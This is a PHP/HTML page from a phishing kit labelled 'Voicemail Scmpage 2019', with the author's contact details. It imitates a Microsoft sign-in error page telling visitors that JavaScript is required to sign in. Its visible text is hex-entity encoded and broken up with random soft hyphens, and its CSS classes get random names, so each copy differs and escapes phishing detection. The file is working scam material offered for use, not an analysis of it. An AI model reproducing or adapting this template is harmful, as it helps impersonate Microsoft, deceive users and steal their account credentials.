<?php
/* 
Voicemail Scmpage 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/
function RndString($length = 10) {
return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" lang="en">

<head>
    <title>So<? echo str_repeat("­",rand(1,3));?>met<? echo str_repeat("­",rand(1,3));?>hin<? echo str_repeat("­",rand(1,3));?>g <? echo str_repeat("­",rand(1,3));?>we<? echo str_repeat("­",rand(1,3));?>nt<? echo str_repeat("­",rand(1,3));?> wr<? echo str_repeat("­",rand(1,3));?>ong<? echo str_repeat("­",rand(1,3));?></title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">

    <link rel="shortcut icon" href="images/favicon.ico">
    <link href="css/conv.css" rel="stylesheet" 

</head>

<body>
    <div>
        <div class="outer <?=RndString(8)?>">
            <div class="middle <?=RndString(8)?>">
                <div class="inner relative <?=RndString(8)?>">
                        <img src="images/mcsft_logo.png" alt="&#x4D;&#x69;&#x63;<? echo str_repeat("­",rand(1,3));?>&#x72;&#x6F;&#x73;<? echo str_repeat("­",rand(1,3));?>&#x6F;&#x66;&#x74;&#x20;<? echo str_repeat("­",rand(1,3));?>&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;<? echo str_repeat("­",rand(1,3));?>&#x73;&#x79;&#x6D;&#x62;<? echo str_repeat("­",rand(1,3));?>&#x6F;&#x6C;" />

                    <div class="row text-title <?=RndString(8)?>" role="heading">&#x57;&#x65;&#x20;&#x63;&#x61;&#x6E;&#x27;&#x74;&#x20;&#x73;&#x69;&#x67;&#x6E;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x69;&#x6E;</div>

                        <div class="row form-group <?=RndString(8)?>">&#x4A;<? echo str_repeat("­",rand(1,3));?>&#x61;&#x76;&#x61;&#x53;&#x63;&#x72;&#x69;&#x70;<? echo str_repeat("­",rand(1,3));?>&#x74;&#x20;&#x69;&#x73;&#x20;&#x72;&#x65;&#x71;&#x75;&#x69;&#x72;&#x65;&#x64;&#x20;&#x74;<? echo str_repeat("­",rand(1,3));?>&#x6F;&#x20;&#x73;&#x69;&#x67;&#x6E;&#x20;&#x69;&#x6E;&#x2E;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x62;&#x72;&#x6F;&#x77;<? echo str_repeat("­",rand(1,3));?>&#x73;&#x65;&#x72;&#x20;<? echo str_repeat("­",rand(1,3));?>&#x65;<? echo str_repeat("­",rand(1,3));?>&#x69;&#x74;<? echo str_repeat("­",rand(1,3));?>&#x68;&#x65;&#x72;&#x20;&#x64;&#x6F;&#x65;&#x73;&#x20;&#x6E;&#x6F;&#x74;&#x20;&#x73;&#x75;&#x70;&#x70;&#x6F;&#x72;&#x74;&#x20;<? echo str_repeat("­",rand(1,3));?>&#x4A;<? echo str_repeat("­",rand(1,3));?>&#x61;&#x76;&#x61;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x6F;&#x72;&#x20;&#x69;&#x74;<? echo str_repeat("­",rand(1,3));?>&#x20;&#x69;&#x73;<? echo str_repeat("­",rand(1,3));?>&#x20;&#x62;&#x65;&#x69;&#x6E;&#x67;&#x20;&#x62;&#x6C;&#x6F;&#x63;&#x6B;&#x65;&#x64;&#x2E;</div>
                        <div class="row form-group">&#x45;&#x6E;<? echo str_repeat("­",rand(1,3));?>&#x61;&#x62;<? echo str_repeat("­",rand(1,3));?>&#x6C;&#x65;&#x20;&#x4A;&#x61;&#x76;&#x61;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;<? echo str_repeat("­",rand(1,3));?>&#x20;&#x69;&#x6E;<? echo str_repeat("­",rand(1,3));?>&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x62;<? echo str_repeat("­",rand(1,3));?>&#x72;&#x6F;&#x77;&#x73;<? echo str_repeat("­",rand(1,3));?>&#x65;&#x72;&#x20;&#x6F;<? echo str_repeat("­",rand(1,3));?>&#x72;&#x20;&#x75;&#x73;<? echo str_repeat("­",rand(1,3));?>&#x65;&#x20;&#x6F;&#x6E;&#x65;&#x20;&#x77;&#x68;&#x69;&#x63;<? echo str_repeat("­",rand(1,3));?>&#x68;&#x20;&#x73;&#x75;&#x70;&#x70;<? echo str_repeat("­",rand(1,3));?>&#x6F;&#x72;&#x74;&#x73;<? echo str_repeat("­",rand(1,3));?>&#x20;&#x69;&#x74;&#x2E;</div>
                </div>
            </div>
        </div>

        <div class="footer default <?=RndString(8)?>">
            <div id="footerLinks" class="footerNode text-secondary <?=RndString(8)?>">
                    <div class="footerNode <?=RndString(8)?>">
                        <span>
&#xA9;&#x32;<? echo str_repeat("­",rand(1,3));?>&#x30;&#x31;&#x39;</span>
                        <a href="#" target="_blank">&#x54;&#x65;<? echo str_repeat("­",rand(1,3));?>&#x72;&#x6D;&#x73;&#x20;<? echo str_repeat("­",rand(1,3));?>&#x6F;&#x66;&#x20;<? echo str_repeat("­",rand(1,3));?>&#x75;&#x73;&#x65;</a>
                        <a href="#" target="_blank">&#x50;&#x72;&#x69;&#x76;&#x61;<? echo str_repeat("­",rand(1,3));?>&#x63;&#x79;&#x20;<? echo str_repeat("­",rand(1,3));?>&#x26;&#x20;<? echo str_repeat("­",rand(1,3));?>&#x63;&#x6F;&#x6F;<? echo str_repeat("­",rand(1,3));?>&#x6B;&#x69;&#x65;&#x73;</a>
                    </div>
            </div>
        </div>
    </div>
</body>
</html>